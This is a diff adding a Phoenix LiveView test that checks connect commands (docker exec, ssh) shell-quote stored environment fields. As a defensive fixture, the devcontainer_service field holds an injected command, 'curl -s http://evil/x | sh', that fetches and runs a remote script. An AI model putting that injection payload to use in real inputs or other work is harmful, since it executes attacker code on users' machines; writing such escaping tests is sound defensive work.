@@ -93,6 +93,37 @@ defmodule ForemanWeb.PagesTest do
            )
   end
 
+  # Results are checked before they're stored, but rows from before that
+  # weren't, and these commands are pasted into a shell.
+  test "connect commands quote anything that isn't a plain name", %{
+    conn: conn,
+    user: user,
+    repo: repo,
+    box: box
+  } do
+    Application.put_env(:foreman, :tailscale, %{client_id: "c", client_secret: "s"})
+    on_exit(fn -> Application.delete_env(:foreman, :tailscale) end)
+
+    env = environment_fixture(user: user, repo: repo, box: box)
+
+    env =
+      Repo.update!(
+        Ecto.Changeset.change(env,
+          remote_user: "vs code",
+          workspace_folder: "/w/it's here",
+          devcontainer_service: "x true; curl -s http://evil/x | sh; #"
+        )
+      )
+
+    {:ok, view, _html} = live(conn, ~p"/environments/#{env.id}")
+
+    assert view |> element("#exec-command") |> render() =~
+             "docker exec -it -u &#39;vs code&#39; -w &#39;/w/it&#39;&quot;&#39;&quot;&#39;s here&#39; " <>
+               "&#39;#{env.slug}-x true; curl -s http://evil/x | sh; #-1&#39; bash -l"
+
+    assert view |> element("#ssh-command") |> render() =~ "ssh &#39;vs code&#39;@#{env.slug}"
+  end
+
   test "without Tailscale, a started environment says why SSH and VS Code are missing", %{
     conn: conn,
     user: user,
